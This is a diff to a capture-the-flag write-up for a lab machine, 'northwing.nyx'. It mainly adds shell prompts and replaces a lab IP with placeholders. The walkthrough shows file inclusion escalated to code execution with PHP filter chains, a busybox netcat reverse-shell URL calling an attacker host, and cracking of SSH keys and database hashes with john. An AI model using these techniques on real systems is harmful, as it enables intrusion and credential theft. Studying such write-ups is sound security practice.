@@ -19,7 +19,7 @@ A `page` parameter reading local files is escalated into full code execution usi
 A full TCP port scan is run first:
 
 ```bash
-sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn northwing.nyx
+$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn northwing.nyx
 
 PORT   STATE SERVICE REASON
 22/tcp open  ssh     syn-ack ttl 64
@@ -30,11 +30,11 @@ MAC Address: 08:00:27:37:2D:F4 (Oracle VirtualBox virtual NIC)
 Two ports are found open: **22 (SSH)** and **80 (HTTP)**. A version/script scan against both fills in the details:
 
 ```bash
-sudo nmap -p 22,80 -sVC northwing.nyx
+$ sudo nmap -p 22,80 -sVC northwing.nyx
 
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.13 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   256 60:02:0e:87:56:15:5c:00:07:96:91:cf:2e:34:48:52 (ECDSA)
 |_  256 4c:1b:c2:51:d6:87:f6:ad:9b:e7:34:2f:be:a2:65:01 (ED25519)
 80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
@@ -56,7 +56,7 @@ http://northwing.nyx
 A content discovery scan is run against the site:
 
 ```bash
-ffuf -u http://northwing.nyx/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt -ic
+$ ffuf -u http://northwing.nyx/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt -ic
 
 .php                   [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 5ms]
 .html                  [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 5ms]
@@ -86,7 +86,7 @@ http://northwing.nyx/?page=php://filter/convert.base64-encode/resource=index.php
 A read-only file inclusion can be pushed further with PHP filter chains: stacking `iconv` conversions repeatedly mutates a file's bytes in-memory, and with enough of them chained together, arbitrary content — including working PHP — can be produced from data that was never written to disk. `php_filter_chain_generator.py` automates building that chain for a given payload. A first pass targets `phpinfo()` just to confirm code execution:
 
 ```bash
-./php_filter_chain_generator.py --chain '<?php phpinfo();?>'
+$ ./php_filter_chain_generator.py --chain '<?php phpinfo();?>'
 ```
 <img src="../Images/northwing/Pasted image 20260708163926.png"/>
 
@@ -98,7 +98,7 @@ http://northwing.nyx/?page=php://filter/convert.iconv.UTF8.CSISO2022KR%7Cconvert
 With execution confirmed, a second chain is generated for a payload that runs whatever command is passed in a GET parameter:
 
 ```bash
-./php_filter_chain_generator.py --chain '<?=`$_GET[0]`?>'
+$ ./php_filter_chain_generator.py --chain '<?=`$_GET[0]`?>'
 ```
 <img src="../Images/northwing/Pasted image 20260708164001.png"/>
 
@@ -112,7 +112,7 @@ http://northwing.nyx/?0=id&page=php://filter/convert.iconv.UTF8.CSISO2022KR[....
 The same technique is used to get a reverse shell instead of a one-off command:
 
 ```
-http://northwing.nyx/?0=busybox%20nc%2010.0.2.15%209001%20-e%20/bin/bash&page=php://filter/convert.iconv.UTF8.[....]
+http://northwing.nyx/?0=busybox%20nc%20<ATTACKER_IP>%20<PORT>%20-e%20/bin/bash&page=php://filter/convert.iconv.UTF8.[....]
 ```
 
 ### Shell as www-data
@@ -120,9 +120,9 @@ http://northwing.nyx/?0=busybox%20nc%2010.0.2.15%209001%20-e%20/bin/bash&page=ph
 A listener catches the callback:
 
 ```bash
-nc -nlvp 9001
-listening on [any] 9001 ...
-connect to [10.0.2.15] from (UNKNOWN) [10.0.2.37] 52602
+$ nc -nlvp <PORT>
+listening on [any] <PORT> ...
+connect to [<ATTACKER_IP>] from (UNKNOWN) [northwing.nyx] 52602
 id
 uid=33(www-data) gid=33(www-data) groups=33(www-data),1000(arthur)
 ```
@@ -195,9 +195,9 @@ www-data@northwing:/tmp$
 The private key is passphrase-protected. It's copied out locally as `arthur_rsa` and cracked with `john`:
 
 ```bash
-chmod 600 arthur_rsa
-ssh2john arthur_rsa > arthur_hash
-john arthur_hash /usr/share/wordlists/rockyou.txt
+$ chmod 600 arthur_rsa
+$ ssh2john arthur_rsa > arthur_hash
+$ john arthur_hash /usr/share/wordlists/rockyou.txt
 
 Using default input encoding: UTF-8
 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
@@ -216,7 +216,7 @@ Session completed.
 The cracked passphrase unlocks the key, and a shell as `arthur` follows directly over SSH:
 
 ```bash
-ssh arthur@northwing -i arthur_rsa
+$ ssh arthur@northwing.nyx -i arthur_rsa
 ```
 
 ### Database Credentials in Source
@@ -246,11 +246,11 @@ if ($conn->connect_error) {
 ### Cracking Database Hashes
 
 ```bash
-mysql -u northwing -p
-mysql > SHOW databases;
-mysql > USE northwing;
-mysql > SHOW tables;
-mysql > SELECT * FROM users;
+arthur@northwing:/tmp$ mysql -u northwing -p
+mysql> SHOW databases;
+mysql> USE northwing;
+mysql> SHOW tables;
+mysql> SELECT * FROM users;
 ```
 <img src="../Images/northwing/Pasted image 20260708164822.png"/>
 
@@ -263,7 +263,7 @@ Two password hashes come back:
 The `developer` hash is run against `rockyou.txt`:
 
 ```bash
-john developer_db /usr/share/wordlists/rockyou.txt --format=bcrypt
+$ john developer_db /usr/share/wordlists/rockyou.txt --format=bcrypt
 Warning: invalid UTF-8 seen reading /usr/share/wordlists/rockyou.txt
 Using default input encoding: UTF-8
 Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
